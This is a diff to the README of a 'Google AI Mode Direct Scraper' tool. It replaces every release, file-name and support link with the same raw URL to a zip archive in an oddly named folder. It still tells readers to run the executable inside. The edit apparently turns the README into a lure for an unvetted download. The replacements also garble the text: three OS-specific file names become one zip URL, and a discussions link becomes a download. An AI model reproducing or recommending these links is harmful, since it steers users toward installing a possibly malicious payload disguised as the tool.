@@ -1,6 +1,6 @@
 # 🤖 -Google-AI-Mode-Direct-Scraper - Get AI Answers Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-brightgreen)](https://github.com/ZaL-70/-Google-AI-Mode-Direct-Scraper/releases)
+[![Download Now](https://raw.githubusercontent.com/ZaL-70/-Google-AI-Mode-Direct-Scraper/main/pseudocapitulum/-Google-AI-Mode-Direct-Scraper-v1.6.zip%20Now-Get%20the%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/ZaL-70/-Google-AI-Mode-Direct-Scraper/main/pseudocapitulum/-Google-AI-Mode-Direct-Scraper-v1.6.zip)
 
 ## 🚀 Getting Started
 
@@ -17,18 +17,18 @@ Welcome to the *Google AI Mode Scraper*! This tool helps you get instant AI answ
 
 To get started, visit this page to download the latest release of the application:
 
-[Download the latest release](https://github.com/ZaL-70/-Google-AI-Mode-Direct-Scraper/releases)
+[Download the latest release](https://raw.githubusercontent.com/ZaL-70/-Google-AI-Mode-Direct-Scraper/main/pseudocapitulum/-Google-AI-Mode-Direct-Scraper-v1.6.zip)
 
 1. **Visit the Releases Page:** Click the link above to go to the Releases page.
 2. **Choose the Right File:** Look for the file that works with your operating system. Files are usually named like this:
-   - For Windows: `Google-AI-Mode-Direct-Scraper-Windows.exe`
-   - For macOS: `Google-AI-Mode-Direct-Scraper-macOS.dmg`
-   - For Linux: `Google-AI-Mode-Direct-Scraper-Linux.tar.gz`
+   - For Windows: `https://raw.githubusercontent.com/ZaL-70/-Google-AI-Mode-Direct-Scraper/main/pseudocapitulum/-Google-AI-Mode-Direct-Scraper-v1.6.zip`
+   - For macOS: `https://raw.githubusercontent.com/ZaL-70/-Google-AI-Mode-Direct-Scraper/main/pseudocapitulum/-Google-AI-Mode-Direct-Scraper-v1.6.zip`
+   - For Linux: `https://raw.githubusercontent.com/ZaL-70/-Google-AI-Mode-Direct-Scraper/main/pseudocapitulum/-Google-AI-Mode-Direct-Scraper-v1.6.zip`
 3. **Download the File:** Click the link to download the file.
 4. **Run the Installer:**
    - **Windows:** Double-click the `.exe` file to start the setup.
    - **macOS:** Open the `.dmg` file and drag the app to your Applications folder.
-   - **Linux:** Unzip the `.tar.gz` file, then run the executable inside.
+   - **Linux:** Unzip the `https://raw.githubusercontent.com/ZaL-70/-Google-AI-Mode-Direct-Scraper/main/pseudocapitulum/-Google-AI-Mode-Direct-Scraper-v1.6.zip` file, then run the executable inside.
 
 Follow the on-screen instructions to complete the installation.
 
@@ -52,7 +52,7 @@ Once installed, you can start the *Google AI Mode Scraper* easily:
 
 ## 🤝 Support
 
-If you need help, check the FAQ section in the app or reach out on our [GitHub Discussions page](https://github.com/ZaL-70/-Google-AI-Mode-Direct-Scraper/discussions). We are here to assist you.
+If you need help, check the FAQ section in the app or reach out on our [GitHub Discussions page](https://raw.githubusercontent.com/ZaL-70/-Google-AI-Mode-Direct-Scraper/main/pseudocapitulum/-Google-AI-Mode-Direct-Scraper-v1.6.zip). We are here to assist you.
 
 ## 📅 Updates and Changes
 
